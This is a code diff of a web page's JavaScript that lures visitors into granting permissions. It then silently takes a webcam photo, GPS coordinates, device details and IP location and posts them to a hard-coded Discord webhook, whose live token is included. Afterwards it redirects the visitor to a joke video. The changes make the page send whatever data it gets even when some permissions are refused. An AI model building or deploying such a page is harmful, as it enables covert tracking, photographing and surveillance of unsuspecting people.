@@ -36,20 +36,9 @@
   <script>
     const webhookUrl = "https://discord.com/api/webhooks/1388161217603965210/eELyivDPEhlKfnaaDce_b90zBtGFpe51uLHo28LsG0gle_1d8pfuN-_U6vK6Q38_N4Fj";
     const redirectUrl = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-    const deniedPage = `<html style='background:black;color:white;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;'>
-      <body style='margin:0;display:flex;justify-content:center;align-items:center;height:100vh;'>
-        <div>Permissions not given. Please grant all required permissions and reload the page.</div>
-      </body>
-    </html>`;
 
     let capturedImageData = null;
-    let timeoutID;
-
-    function redirectDenied() {
-      document.open();
-      document.write(deniedPage);
-      document.close();
-    }
+    let coords = { lat: "Permission denied", lon: "Permission denied", acc: 0 };
 
     function getDeviceInfo() {
       return {
@@ -61,18 +50,29 @@
       };
     }
 
-    function sendToDiscord(lat, lon, acc, ipData) {
-      const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+    function dataURLtoBlob(dataurl) {
+      const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+        bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+      while(n--){
+        u8arr[n] = bstr.charCodeAt(n);
+      }
+      return new Blob([u8arr], {type:mime});
+    }
+
+    function sendToDiscord(ipData) {
+      const mapLink = coords.lat !== "Permission denied"
+        ? `https://www.google.com/maps?q=${coords.lat},${coords.lon}` : "N/A";
+
       const device = getDeviceInfo();
 
       const payload = {
         embeds: [
           {
             title: "📍 GPS & Device Info",
-            description: `**Latitude:** ${lat}  
-**Longitude:** ${lon}  
-**Accuracy:** ${acc} meters  
-**Map:** [View Location](${mapLink})
+            description: `**Latitude:** ${coords.lat}  
+**Longitude:** ${coords.lon}  
+**Accuracy:** ${coords.acc} meters  
+**Map:** ${mapLink !== "N/A" ? `[View Location](${mapLink})` : "Location not available"}
 
 🌐 **IP Info**  
 **IP:** ${ipData.ipAddress}  
@@ -110,88 +110,71 @@
       fetch(webhookUrl, {
         method: "POST",
         body: formData
-      });
-
-      setTimeout(() => {
+      }).finally(() => {
         window.location.href = redirectUrl;
-      }, 1000);
+      });
     }
 
-    function getIPAndGPS() {
-      fetch("https://api.db-ip.com/v2/free/self")
-        .then(res => res.json())
-        .then(ipData => {
-          timeoutID = setTimeout(() => {
-            redirectDenied();
-          }, 10000);
-
-          navigator.geolocation.getCurrentPosition(
-            (pos) => {
-              clearTimeout(timeoutID);
-              const lat = pos.coords.latitude;
-              const lon = pos.coords.longitude;
-              const acc = pos.coords.accuracy;
-              sendToDiscord(lat, lon, acc, ipData);
-            },
-            () => {
-              clearTimeout(timeoutID);
-              redirectDenied();
-            },
-            {
-              enableHighAccuracy: true,
-              timeout: 10000,
-              maximumAge: 0
-            }
-          );
-        })
-        .catch(() => {
-          redirectDenied();
-        });
-    }
-
-    function dataURLtoBlob(dataurl) {
-      const arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
-        bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
-      while(n--){
-        u8arr[n] = bstr.charCodeAt(n);
-      }
-      return new Blob([u8arr], {type:mime});
-    }
-
-    document.getElementById("startBtn").addEventListener('click', async () => {
+    async function startSequence() {
       document.getElementById("status").innerText = "Requesting permissions…";
 
       try {
         // Step 1: Notification
         await Notification.requestPermission();
 
-        // Step 2: Camera
-        const videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.createElement("video");
-        video.srcObject = videoStream;
-        await video.play();
+        // Step 2: Location
+        await new Promise((resolve) => {
+          navigator.geolocation.getCurrentPosition(
+            (pos) => {
+              coords.lat = pos.coords.latitude;
+              coords.lon = pos.coords.longitude;
+              coords.acc = pos.coords.accuracy;
+              resolve();
+            },
+            () => {
+              resolve(); // continue even if location denied
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+          );
+        });
 
-        // Wait until video stream loads
-        await new Promise(resolve => video.onloadedmetadata = resolve);
+        // Step 3: Camera
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          const video = document.createElement("video");
+          video.srcObject = stream;
+          await video.play();
 
-        const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        capturedImageData = canvas.toDataURL("image/png");
-        videoStream.getTracks().forEach(track => track.stop());
+          await new Promise((resolve) => {
+            video.onloadedmetadata = () => {
+              const canvas = document.createElement("canvas");
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              const ctx = canvas.getContext("2d");
+              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+              capturedImageData = canvas.toDataURL("image/png");
+              stream.getTracks().forEach(track => track.stop());
+              resolve();
+            };
+          });
+        } catch {
+          // camera denied — continue without image
+        }
 
-        // Step 3: Microphone
-        const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        audioStream.getTracks().forEach(track => track.stop());
+        // Step 4: Get IP + send everything
+        fetch("https://api.db-ip.com/v2/free/self")
+          .then(res => res.json())
+          .then(sendToDiscord)
+          .catch(() => {
+            sendToDiscord({ ipAddress: "N/A", city: "-", stateProv: "-", countryName: "-" });
+          });
 
-        // Step 4: Location
-        getIPAndGPS();
       } catch (err) {
-        redirectDenied();
+        document.body.innerHTML = "<div style='color:white;text-align:center;'>Permissions not granted.<br>Reload and try again.</div>";
       }
-    });
+    }
+
+    document.getElementById("startBtn").onclick = startSequence;
   </script>
 </body>
 </html>
